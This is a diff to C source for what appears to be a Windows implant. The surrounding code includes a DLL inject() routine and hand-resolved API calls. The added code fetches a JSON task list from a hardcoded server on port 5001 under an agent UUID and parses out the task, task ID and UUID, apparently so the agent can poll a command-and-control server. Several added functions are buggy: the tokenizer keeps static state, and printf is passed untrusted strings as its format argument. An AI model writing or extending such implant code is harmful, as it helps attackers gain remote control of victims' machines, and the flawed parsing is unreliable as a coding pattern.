@@ -140,6 +140,16 @@ void* memset(void* dest, int val, size_t len)
     return dest;
 }
 
+int myStrlenA(const CHAR* s1)
+{
+    const CHAR *s2 = s1; // Pointer to traverse the string
+
+    while (*s2) {
+        s2++;
+    }
+    return s2 - s1;
+}
+
 int myStrlenW(const WCHAR* s1)
 {
     const WCHAR *s2 = s1; // Pointer to traverse the wide string
@@ -750,6 +760,92 @@ HANDLE inject(PAPI api, LPVOID lpDll, DWORD dwDllSize) { //
     return hDllBase;
 }
 
+CHAR* myStrtok(CHAR* str, CHAR delim)
+{
+    static DWORD index = 0;
+    CHAR* token = {0};
+    DWORD lenStr = myStrlenA(str);
+    str += index;
+
+    for (int i=0; i<lenStr; i++)
+    {
+        if (str[i] == delim)
+        {
+            str[i] = '\0';
+        }
+    }
+
+    token = str;
+    index += myStrlenA(token)+1;    // +1 for null byte
+    return token;
+}
+
+CHAR* myStartTrim(CHAR* str, CHAR trim)
+{
+    while (str[0] == trim)
+    { str++; }
+    return str;
+}
+
+CHAR* myEndTrim(CHAR* str, CHAR trim)
+{
+    for (int i=myStrlenA(str)-1; i>=0; i--)     // -1 for null terminator
+    {
+        if(str[i] == trim)
+        { str[i] = '\0'; }          // change trim with a null terminator
+        else
+        { return str; }
+    }
+    return str;
+}
+
+CHAR* myTrim(CHAR* str, CHAR trim)
+{
+    str = myStartTrim(str, trim);
+    str = myEndTrim(str, trim);
+    return str;
+}
+
+CHAR* parseJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** uuid) {
+    CHAR* task;
+    CHAR delim = {'\n'};
+    CHAR* token = myStrtok(json, delim);
+    CHAR blacklist[] = {'[', ']', '\0'};
+
+    // SKIP [ and ]
+    for (int i=0; i<=myStrlenA(blacklist)-1; i++)
+    {
+        //((PRINTF)api->printf)("out\n");
+        //((PRINTF)api->printf)("%d\n", myStrlenA(token)-1);
+        for (int j=0; j<=myStrlenA(token)-1; j++)
+        {
+            //((PRINTF)api->printf)("in\n");
+            //((PRINTF)api->printf)("testing %c:%c\n", token[j], blacklist[i]);
+            if (token[j] == blacklist[i])
+            {
+                //((PRINTF)api->printf)("changing\n");
+                //taskId = myTrim(api, myStrtok(api, json, delim), ',');      // get task id
+                token = myStrtok(json, delim);
+                i=-1;
+                //((PRINTF)api->printf)("broke\n");
+                break;
+            }
+        }
+    }
+
+    // dont look
+    *taskId = myTrim(token, ' ');
+    *taskId = myEndTrim(*taskId, ',');
+    task = myTrim(myStrtok(json, delim), ' ');
+    task = myEndTrim(task, ',');
+    task = myTrim(task, '"');
+    *uuid = myTrim(myStrtok(json, delim), ' ');
+    *uuid = myEndTrim(*uuid, ',');
+    *uuid = myTrim(*uuid, '"');
+
+    return task;
+}
+
 void messagebox() {
     API Api = { 0 };
     PAPI api = &Api;
@@ -872,11 +968,21 @@ void messagebox() {
     WCHAR uuid[] = {'1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0};
     WCHAR* fullPath = myConcat(api, path, uuid);
     INTERNET_PORT port = 5001;
-    CHAR* test = GetRequest(api, wServer, port, fullPath);
-    CHAR fString[] = {L'2', L' ', L'%', L's', 0};
-    ((PRINTF)api->printf)(fString, test);
 
-    ((FREE)api->free)(test);
+    CHAR* jsonResponse = GetRequest(api, wServer, port, fullPath);
+    CHAR fString[] = {L'%', L's', 0};
+    ((PRINTF)api->printf)(fString, jsonResponse);
+
+    CHAR* taskId = {0};
+    CHAR* agentUuid = {0};
+    CHAR* task;
+    task = parseJsonTask(api, jsonResponse, &taskId, &agentUuid);
+
+    ((PRINTF)api->printf)(task);
+    ((PRINTF)api->printf)(taskId);
+    ((PRINTF)api->printf)(agentUuid);
+
+    ((FREE)api->free)(jsonResponse);
     //((FREE)api->free)(pEsgStdDll);
 }
 
